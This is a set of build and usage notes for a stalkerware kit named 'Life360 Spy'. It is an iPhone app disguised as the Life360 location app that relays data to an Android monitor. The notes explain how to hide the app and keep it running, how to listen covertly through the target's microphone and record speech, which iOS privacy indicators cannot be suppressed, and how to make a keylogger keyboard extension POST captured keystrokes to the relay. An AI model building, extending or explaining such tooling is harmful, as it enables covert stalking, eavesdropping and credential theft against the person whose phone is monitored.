# Life360 Spy - full notes

    iPhone (agent) --ws + AES-GCM over Tailscale--> Relay --> Android (monitor)

## 1. Relay

    bash start-relay.sh

Listens on :8080. TOKEN comes from ./.token which configure.sh writes.

Optional push alerts: install the ntfy app, pick a hard-to-guess topic, then

    NTFY=https://ntfy.sh/your-topic bash start-relay.sh

## 2. iPhone app

Built by go.sh via XcodeGen + GitHub Actions macos runner. No Mac needed.

## 3. Android monitor

Built by go.sh via GitHub Actions ubuntu runner.

## 4. Install day

See QUICKSTART.md section 8.

## 5. Aftercare

  - Never force-quit the iPhone app from the app switcher.
  - Keep Background App Refresh ON.
  - After a reboot the app stays dead until opened once.
  - If you used a free signer, re-sign when it expires (7 days typically).
    TrollStore on iOS <= 17.0 never expires.
  - Reopen the hidden app via App Library / Spotlight search "Life360".

## 6. Daily use

Mic defaults to ON DEMAND: no orange dot until you press Listen.
Press Listen -> dot appears, live audio plays, every utterance saved as WAV.
2 min of silence -> dot out. Hold = untimed session.

## 7. Troubleshooting

  Relay unreachable        relay not running, or wrong IP in Config.swift
  Dot never goes out       mic mode is not onDemand
  No clips                 clipCapture off, or mic not armed
  Permission denied        iPhone Settings > Privacy
  Android kills monitor    Battery > Unrestricted
  Blank WebView            usesCleartextTraffic, or RELAY has http:// prefix
  go.sh fails at gh        run: gh auth login

## 8. Known limits (no jailbreak)

  - Orange mic dot / green camera dot cannot be suppressed by any API.
  - No SMS / iMessage reading without a Mac bridge.
  - iOS shows a "using your location in the background" banner after ~3 days.
  - Settings > Privacy > Location Services lists Life360 twice.

## 9. If the keylog stays empty

Unsigned builds often drop the App Group entitlement, so the keyboard
extension cannot reach the shared container the main app reads.

Fix: have the keyboard POST directly to the relay instead.

  1. Add Config.swift to the Keyboard target in project.yml:
         sources: [iphone/Keyboard.swift, iphone/Config.swift]
  2. Replace the body of KeyboardViewController with a version that
     URLSession-POSTs the log to http://<host>:8080/keys?token=<token>
  3. In server.js, accept POST /keys and broadcast it as a "keys" message.
  4. Remove the kb_seen check from Permissions.swift.
